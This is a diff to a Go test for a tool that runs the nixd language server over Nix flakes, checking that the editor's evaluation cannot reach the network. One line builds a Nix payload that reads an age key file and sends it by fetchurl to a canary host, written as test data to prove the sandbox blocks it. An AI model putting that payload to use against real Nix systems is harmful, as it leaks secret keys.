@@ -510,9 +510,17 @@ func TestLanguageServerIsPureWithRealNix(t *testing.T) {
 	e := newEnv(t)
 	e.login(t)
 	e.svc.Jobs.Nix = "nix"
-	e.s.Nixd = []string{"nixd"}
+	nixdLog := filepath.Join(t.TempDir(), "nixd.log")
+	e.s.Nixd = []string{"sh", "-c", `exec nixd 2>>"$0"`, nixdLog}
+	t.Cleanup(func() {
+		if b, _ := os.ReadFile(nixdLog); t.Failed() {
+			t.Logf("nixd's log:\n%s", b)
+		}
+	})
+	// Each option source must evaluate: nixd answers no completion while one has no value.
+	const others = `homeConfigurations.test.options = { }; darwinConfigurations.test.options = { };`
 	configs := `{ test.options.canary = { }; }`
-	hash, err := e.svc.Write("flake.nix", `{ outputs = _: { nixosConfigurations = `+configs+`; }; }`, "")
+	hash, err := e.svc.Write("flake.nix", `{ outputs = _: { nixosConfigurations = `+configs+`; `+others+` }; }`, "")
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -521,23 +529,23 @@ func TestLanguageServerIsPureWithRealNix(t *testing.T) {
 	if out, err := git.CombinedOutput(); err != nil {
 		t.Fatalf("%v: %s", err, out)
 	}
-	if got := editorCompletes(t, e); !slices.Contains(got, "canary") {
+	if got := complete(t, openEditor(t, e)); !slices.Contains(got, "canary") {
 		t.Fatalf("completions from the fleet's options: %q", got)
 	}
 	// What an edit token can write: not committed, and nobody reads an error.
 	leak := `builtins.seq (builtins.fetchurl "` + canary.URL + `/${builtins.readFile "` + key + `"}") ` + configs
-	if _, err := e.svc.Write("flake.nix", `{ outputs = _: { nixosConfigurations = `+leak+`; }; }`, hash); err != nil {
+	if _, err := e.svc.Write("flake.nix", `{ outputs = _: { nixosConfigurations = `+leak+`; `+others+` }; }`, hash); err != nil {
 		t.Fatal(err)
 	}
-	if got := editorCompletes(t, e); slices.Contains(got, "canary") || leaks.Load() != 0 {
-		t.Fatalf("fleet code read the age key and sent it out: %d requests, completions %q", leaks.Load(), got)
+	openEditor(t, e) // the fetch would be part of the evaluation openEditor waits for
+	if n := leaks.Load(); n != 0 {
+		t.Fatalf("fleet code read the age key and sent it out (%d requests)", n)
 	}
 }
 
-// editorCompletes opens the editor's language server like the Code view, waits
-// until it has evaluated the NixOS options, and returns what it completes for
-// "canar" in an attribute set.
-func editorCompletes(t *testing.T, e *env) []string {
+// openEditor opens the editor's language server like the Code view and waits
+// until it has evaluated the option sources of its configuration.
+func openEditor(t *testing.T, e *env) *websocket.Conn {
 	t.Helper()
 	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Minute)
 	defer cancel()
@@ -547,22 +555,29 @@ func editorCompletes(t *testing.T, e *env) []string {
 	if err != nil {
 		t.Fatal(err)
 	}
-	defer c.CloseNow()
+	t.Cleanup(func() { c.CloseNow() })
 	for _, m := range []string{
 		`{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"processId":null,"rootUri":null,"capabilities":{"window":{"workDoneProgress":true}}}}`,
 		`{"jsonrpc":"2.0","method":"initialized","params":{}}`,
 	} {
 		c.Write(ctx, websocket.MessageText, []byte(m))
 	}
-	for { // the progress nixd reports for the options from its configuration
+	pending := []string{`"evaluated nixos"`, `"evaluated home-manager"`, `"evaluated nix-darwin"`} // nixd's progress messages
+	for len(pending) > 0 {
 		_, msg, err := c.Read(ctx)
 		if err != nil {
-			t.Fatalf("waiting for nixd to evaluate the NixOS options: %v", err)
+			t.Fatalf("waiting for nixd to evaluate %v: %v", pending, err)
 		}
-		if strings.Contains(string(msg), `"evaluated nixos"`) {
-			break
-		}
+		pending = slices.DeleteFunc(pending, func(p string) bool { return strings.Contains(string(msg), p) })
 	}
+	return c
+}
+
+// complete returns what the language server completes for "canar" in an attribute set.
+func complete(t *testing.T, c *websocket.Conn) []string {
+	t.Helper()
+	ctx, cancel := context.WithTimeout(context.Background(), time.Minute)
+	defer cancel()
 	for _, m := range []string{
 		`{"jsonrpc":"2.0","method":"textDocument/didOpen","params":{"textDocument":{"uri":"file:///fleet/host.nix","languageId":"nix","version":1,"text":"{ canar = { }; }"}}}`,
 		`{"jsonrpc":"2.0","id":"complete","method":"textDocument/completion","params":{"textDocument":{"uri":"file:///fleet/host.nix"},"position":{"line":0,"character":7}}}`,
